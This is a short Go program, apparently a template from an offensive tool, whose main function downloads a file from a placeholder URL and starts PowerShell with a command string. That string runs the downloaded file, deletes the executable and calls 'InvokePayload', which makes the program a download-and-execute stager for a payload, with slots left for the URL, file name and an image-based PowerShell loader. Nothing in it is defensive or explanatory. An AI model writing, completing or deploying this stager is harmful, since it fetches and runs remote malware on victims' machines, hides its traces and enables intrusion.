package main
import ("os";"os/exec";"net/http";"io")

func downloadFile(filepath string, url string) (err error) {
  // Create the file
  out, err := os.Create(filepath)
  if err != nil  {
    return err
  }
  defer out.Close()

  resp, err := http.Get(url)
  if err != nil {
    return err
  }
  defer resp.Body.Close()

  _, err = io.Copy(out, resp.Body)
  if err != nil  {
    return err
  }

  return nil
}



func main() {
	var url string = "<urlhere>"
	downloadFile("<filename>", url)
	var params string = `$path = -join($pwd.path, "\<filename>"); <psimage_output>; .\<filename>; del .\<filename>.exe; InvokePayload`
	exec.Command("powershell", params).Start()
}